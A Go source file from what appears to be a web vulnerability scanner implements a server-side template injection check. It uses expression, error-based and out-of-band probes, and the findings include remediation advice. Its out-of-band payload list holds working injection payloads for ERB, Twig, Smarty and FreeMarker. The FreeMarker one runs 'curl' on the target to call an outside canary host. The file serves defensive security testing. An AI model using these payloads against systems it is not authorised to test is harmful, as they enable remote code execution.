package lua_engine

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/londonmax12/hyperz/internal/httpclient"
	"github.com/londonmax12/hyperz/internal/oob"
)

// SSTI detects Server-Side Template Injection by probing whether user input is
// evaluated within a template engine.
//
// Two detection strategies are applied in sequence per sink:
//
// 1. Expression evaluation: sends canary-flanked math expressions in the syntax
// of major template engines (Jinja2, FreeMarker, ERB, Smarty, Velocity, Thymeleaf,
// Ruby interpolation, Razor). A match on canary+expected-result+canary proves the
// engine evaluated the expression. A confirming probe with a different math
// expression is then sent in the same engine syntax; a second match keeps the
// finding at Critical, a confirm-miss demotes it to High (the first hit is still
// strongly diagnostic, but a missed confirm warrants lower confidence).
//
// 2. Error-based: sends deliberately malformed template syntax ({{, ${, <%) and
// looks for engine-specific error signatures. Baseline subtraction (like SQLiError)
// suppresses false positives from pages that legitimately contain engine error text.
//
// At LevelDefault, probes query params and form fields (SinksFor). At LevelAggressive,
// also probes common header vectors (User-Agent, Referer, X-Forwarded-For, etc.).
//
// This is an active (LevelDefault) check.
type SSTI struct{}

const sstiBodyCap = 32 << 10

// sstiOOBPayload describes one engine-specific blind probe: the template
// source to send (with {{URL}} substituted at probe time) and the
// engine label the finding will quote on a hit. Each entry targets a
// distinct template engine, so a Run that sends every payload against
// one sink still attributes a hit to the right engine via the
// registration's Extra metadata.
type sstiOOBPayload struct {
	Engine string
	// Tmpl carries a {{URL}} placeholder replaced with the canary URL
	// before sending. Kept as a string template (not Go's text/template)
	// so the payload source is grep-able verbatim.
	Tmpl string
}

// sstiOOBPayloads is the engine-by-engine list of HTTP-issuing template
// primitives. Each one fires only when the matching engine is rendering
// the sink AND its security configuration permits the primitive
// (allow_url_include on for Twig/Smarty, Execute class in scope for
// FreeMarker, open-uri loadable for ERB). The list is small on purpose:
// a permissive engine in this set is reliably exploitable; padding it
// with marginal-confidence payloads would dilute the signal.
var sstiOOBPayloads = []sstiOOBPayload{
	// Ruby ERB. open-uri is bundled with stdlib so the require almost
	// always succeeds when ERB itself is the engine.
	{Engine: "erb", Tmpl: `<%= require 'open-uri'; open('{{URL}}').read %>`},
	// PHP Twig. include() across a URL needs allow_url_include=On at
	// the PHP level AND a non-sandboxed Twig environment - both are
	// common in legacy apps.
	{Engine: "twig", Tmpl: `{{ include('{{URL}}') }}`},
	// PHP Smarty. Same allow_url_include precondition.
	{Engine: "smarty", Tmpl: `{include file='{{URL}}'}`},
	// Java FreeMarker. The Execute class is a built-in utility; on
	// stacks that left it in scope, a shell-out to curl issues the
	// fetch the listener correlates against.
	{Engine: "freemarker", Tmpl: `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl {{URL}}")}`},
}

// probeOOB sends one request per engine payload, each carrying a
// distinct canary URL. The check does not emit a finding from this
// call; Drain translates listener-side hits into findings after the
// scanner's wait window elapses. Per-probe errors are surfaced via the
// ctx reporter without sinking the whole sink (one engine's transport
// failure shouldn't suppress the others).
func (c SSTI) probeOOB(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, sink Sink) {
	for _, pld := range sstiOOBPayloads {
		if ctx.Err() != nil {
			return
		}
		canary := srv.Register("ssti", map[string]string{
			"target": target,
			"sink":   sink.Name,
			"loc":    string(sink.Loc),
			"method": sink.Method,
			"engine": pld.Engine,
		})
		wire := strings.ReplaceAll(pld.Tmpl, "{{URL}}", canary.HTTPURL)
		_, _, _, _, err := c.send(ctx, client, sink, wire)
		if err != nil {
			Report(ctx, fmt.Errorf("oob probe %s %s=%s engine=%s: %w",
				sink.Loc, sink.Name, sink.URL, pld.Engine, err))
		}
	}
}

// buildSSTIOOBFinding renders one OOB-confirmed SSTI finding. Severity
// is Critical: the engine primitives in sstiOOBPayloads (open-uri,
// include() over URL, FreeMarker Execute) only fire on permissive
// configurations that also expose adjacent RCE primitives, so a hit
// almost certainly indicates a critical exposure rather than an
// information-disclosure-only sink.
func buildSSTIOOBFinding(reg oob.Registration, hits []oob.Hit) Finding {
	target := reg.Extra["target"]
	sink := reg.Extra["sink"]
	loc := reg.Extra["loc"]
	method := reg.Extra["method"]
	engine := reg.Extra["engine"]
	hit := hits[0]
	ua := hit.Headers.Get("User-Agent")
	return Finding{
		Check:    "ssti",
		Target:   target,
		URL:      target,
		Severity: SeverityCritical,
		Title: fmt.Sprintf(
			"Server-Side Template Injection (OOB-confirmed, %s engine) in %s %s %q",
			engine, locDescriptor(Loc(loc)), loc, sink),
		Detail: fmt.Sprintf(
			"Parameter %q (%s) is rendered by the %s template engine with HTTP-issuing primitives "+
				"enabled: canary %s received %d callback(s) (first hit: method=%s, source=%s, user-agent=%q). "+
				"The %s primitives that produced this callback typically expose adjacent RCE; "+
				"treat as remote code execution unless the engine sandbox is independently verified.",
			sink, loc, engine, reg.Canary.HTTPURL, len(hits),
			hit.Method, hit.SourceAddr, ua, engine),
		CWE:   "CWE-1336",
		OWASP: "A03:2021 Injection",
		Remediation: "Never concatenate user input into template source code. Render user input as template " +
			"variables or data objects instead. Disable the engine's URL-issuing primitives (allow_url_include=Off for PHP; " +
			"remove freemarker.template.utility.Execute from the configuration's shared variables; " +
			"sandbox Twig/Smarty environments). Use template engines with sandboxing when user-controlled templates " +
			"are a product requirement.",
		Evidence: &Evidence{
			Method:     method,
			RequestURL: target,
			Snippet: fmt.Sprintf(
				"Engine: %s\nCanary URL: %s\nFirst hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
				engine, reg.Canary.HTTPURL,
				hit.Method, hit.Path, hit.SourceAddr,
				hit.Timestamp.Format(time.RFC3339), ua, len(hits)),
		},
		DedupeKey: MakeKey("ssti", ScopeParam, target, "loc:"+loc, "param:"+sink, "oob:"+engine),
	}
}

func (c SSTI) headerSinks(pageURL string) []Sink {
	var sinks []Sink
	for _, name := range []string{"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host"} {
		sinks = append(sinks, Sink{
			Method: http.MethodGet,
			URL:    pageURL,
			Loc:    LocHeader,
			Name:   name,
			Value:  "",
		})
	}
	return sinks
}

// probe runs the detection sequence for one sink. Returns a finding when either
// expression evaluation (with confirmation) or error-based detection succeeds;
// whichever fires first wins (stops further probing).
func (c SSTI) probe(ctx context.Context, client *httpclient.Client, target string, sink Sink) (*Finding, error) {
	// Baseline: establish the patterns present before our probes, for
	// error-based detection subtraction.
	canary := NewCanary()
	_, _, baselineBody, baselineTruncated, err := c.send(ctx, client, sink, canary)
	if err != nil {
		return nil, err
	}
	baselineErrors := matchSSTIErrors(baselineBody)

	anyTruncated := baselineTruncated

	// Phase 1: Expression evaluation - each probe renders a unique
	// canary-flanked expression. A match proves the engine evaluated the math.
	for _, probe := range SSTIExprProbes() {
		if ctx.Err() != nil {
			break
		}
		tok := NewCanary()
		wire := strings.ReplaceAll(probe.Template, "{{TOKEN}}", tok)
		req, resp, body, truncated, err := c.send(ctx, client, sink, wire)
		if err != nil {
			return nil, err
		}
		if truncated {
			anyTruncated = true
		}

		needle := []byte(tok + probe.Expected + tok)
		if !bytes.Contains(body, needle) {
			continue
		}

		// Confirmation: derive a second probe in the same engine syntax with
		// a different expression. A genuine SSTI evaluates this too; a one-
		// off coincidence on "49" between two canaries (already vanishingly
		// rare with 48-bit canaries) will not survive a second match.
		confirmTpl, confirmExpected := c.confirmProbe(probe)
		confirmTok := NewCanary()
		confirmWire := strings.ReplaceAll(confirmTpl, "{{TOKEN}}", confirmTok)
		_, _, confirmBody, confirmTruncated, confErr := c.send(ctx, client, sink, confirmWire)
		if confErr != nil {
			// Confirmation transport failure is not a reason to suppress the
			// first hit; the network might be flaky but we already have a
			// strong signal. Report the sub-error and proceed at High.
			Report(ctx, fmt.Errorf("ssti confirm %s %s=%s: %w", sink.Loc, sink.Name, sink.URL, confErr))
		}
		if confirmTruncated {
			anyTruncated = true
		}
		confirmNeedle := []byte(confirmTok + confirmExpected + confirmTok)
		confirmed := confErr == nil && bytes.Contains(confirmBody, confirmNeedle)

		severity := SeverityCritical
		titleSuffix := "expression evaluation"
		if !confirmed {
			severity = SeverityHigh
			titleSuffix = "expression evaluation, unconfirmed"
		}

		method, probeURL := requestIdentity(req)
		return &Finding{
			Check:    "ssti",
			Target:   target,
			URL:      probeURL,
			Severity: severity,
			Title:    fmt.Sprintf("Server-Side Template Injection (%s) in %s %s %q", titleSuffix, locDescriptor(sink.Loc), sink.Loc, sink.Name),
			Detail: fmt.Sprintf(
				"Parameter %q (%s) appears to be rendered in a %s-family template engine: payload ssti/%s "+
					"probed %s and evaluated to %s with context marker %q (confirmation probe %s -> %s %s). "+
					"Server-side template injection can range from sensitive data disclosure to remote code "+
					"execution depending on the engine and its sandboxing.",
				sink.Name, sink.Loc, probe.Name, probe.Name,
				probeMathSource(probe), probe.Expected, tok,
				confirmMathSource(probe), confirmExpected, confirmDispositionPhrase(confirmed, confErr),
			),
			CWE:   "CWE-1336",
			OWASP: "A03:2021 Injection",
			Remediation: "Never concatenate user input into template source code. Render user input as template " +
				"variables or data objects instead. Use template engines with sandboxing when user-controlled templates " +
				"are a product requirement.",
			Evidence: &Evidence{
				Method:     method,
				RequestURL: probeURL,
				Status:     statusOf(resp),
				Snippet:    snippet(body, needle, false),
				Exchange:   RecordExchange(req, nil, false, resp, body, truncated),
			},
			DedupeKey: MakeKey("ssti", ScopeParam, target, "loc:"+string(sink.Loc), "param:"+sink.Name),
		}, nil
	}

	// Phase 2: Error-based detection - send deliberately malformed templates
	// and look for engine-specific error patterns (with baseline subtraction).
	for _, errorPayload := range sstiErrorPayloads {
		if ctx.Err() != nil {
			break
		}
		req, resp, body, truncated, err := c.send(ctx, client, sink, errorPayload)
		if err != nil {
			return nil, err
		}
		if truncated {
			anyTruncated = true
		}

		hits := matchSSTIErrors(body)
		newHits := subtractPatterns(hits, baselineErrors)
		if len(newHits) == 0 {
			continue
		}

		method, probeURL := requestIdentity(req)
		return &Finding{
			Check:    "ssti",
			Target:   target,
			URL:      probeURL,
			Severity: SeverityHigh,
			Title:    fmt.Sprintf("Server-Side Template Injection (error-based) in %s %s %q", locDescriptor(sink.Loc), sink.Loc, sink.Name),
			Detail: fmt.Sprintf(
				"Parameter %q (%s) appears to be rendered in a template engine: probe payload %q "+
					"provoked template engine error signature %q. "+
					"An attacker can likely extract sensitive information and may be able to execute code.",
				sink.Name, sink.Loc, errorPayload, newHits[0]),
			CWE:   "CWE-1336",
			OWASP: "A03:2021 Injection",
			Remediation: "Never concatenate user input into template source code. Render user input as template " +
				"variables or data objects instead. Use template engines with sandboxing when user-controlled templates " +
				"are a product requirement.",
			Evidence: &Evidence{
				Method:     method,
				RequestURL: probeURL,
				Status:     statusOf(resp),
				Snippet:    snippet(body, []byte(newHits[0]), true),
				Exchange:   RecordExchange(req, nil, false, resp, body, truncated),
			},
			DedupeKey: MakeKey("ssti", ScopeParam, target, "loc:"+string(sink.Loc), "param:"+sink.Name),
		}, nil
	}

	if anyTruncated {
		Report(ctx, fmt.Errorf("probe %s %s=%s: response body truncated at %d bytes during sweep, "+
			"template injection may have been missed",
			sink.Loc, sink.Name, sink.URL, sstiBodyCap))
	}
	return nil, nil
}

// confirmProbe derives a follow-up template+expected pair from an
// expression probe by swapping its math operands. Every entry in
// SSTIExprProbes pivots on the literal "7*7" / "49"; substituting "8*9"
// / "72" keeps the engine syntax identical while exercising a fresh
// expression a passively-reflecting page cannot replay.
func (SSTI) confirmProbe(p SSTIProbe) (template, expected string) {
	return strings.Replace(p.Template, "7*7", "8*9", 1), "72"
}

// send mutates sink with wireValue, dispatches the request, and reads up to
// sstiBodyCap of the body.
func (c SSTI) send(ctx context.Context, client *httpclient.Client, sink Sink, wireValue string) (*http.Request, *http.Response, []byte, bool, error) {
	req, err := sink.MutateRequest(ctx, wireValue)
	if err != nil {
		return nil, nil, nil, false, err
	}
	resp, err := client.Do(ctx, req)
	if err != nil {
		return req, nil, nil, false, err
	}
	defer resp.Body.Close()
	body, truncated, err := httpclient.ReadBodyCapped(resp, sstiBodyCap)
	if err != nil {
		return req, resp, nil, false, err
	}
	return req, resp, body, truncated, nil
}

// requestIdentity extracts (method, URL) from req with nil-safety. Centralized
// here because the probe finding builders need both fields in the same shape.
func requestIdentity(req *http.Request) (method, rawURL string) {
	if req == nil {
		return "", ""
	}
	if req.URL != nil {
		rawURL = req.URL.String()
	}
	return req.Method, rawURL
}

// locDescriptor returns the human-facing role for a Loc - "parameter" for
// query/form/path/json inputs, "header" for headers, etc. - so the finding
// title reads "in query parameter" rather than "in query query".
func locDescriptor(l Loc) string {
	switch l {
	case LocHeader:
		return "header"
	case LocCookie:
		return "cookie"
	default:
		return "parameter"
	}
}

// probeMathSource extracts the canonical "7*7" inner expression from a probe
// template by stripping the {{TOKEN}} wrappers. Used to render a clean
// "probed 7*7" phrase in the finding detail without leaking framing tokens.
func probeMathSource(p SSTIProbe) string {
	return strings.ReplaceAll(p.Template, "{{TOKEN}}", "")
}

// confirmMathSource returns probeMathSource for the confirm template that
// confirmProbe would derive from p.
func confirmMathSource(p SSTIProbe) string {
	tpl, _ := SSTI{}.confirmProbe(p)
	return strings.ReplaceAll(tpl, "{{TOKEN}}", "")
}

// confirmDispositionPhrase returns the phrase the finding detail uses to
// describe the confirmation probe outcome: "confirmed", "did not confirm",
// or "transport error: <err>" when the confirmation request itself failed.
func confirmDispositionPhrase(confirmed bool, confErr error) string {
	if confErr != nil {
		return fmt.Sprintf("transport error: %v", confErr)
	}
	if confirmed {
		return "confirmed"
	}
	return "did not confirm"
}

// matchSSTIErrors returns every SSTIErrorPatterns entry that appears in body.
// Body is lowercased once per call so substring scans are case-insensitive.
func matchSSTIErrors(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	lower := bytes.ToLower(body)
	var hits []string
	for _, pat := range SSTIErrorPatterns() {
		if bytes.Contains(lower, []byte(pat)) {
			hits = append(hits, pat)
		}
	}
	return hits
}
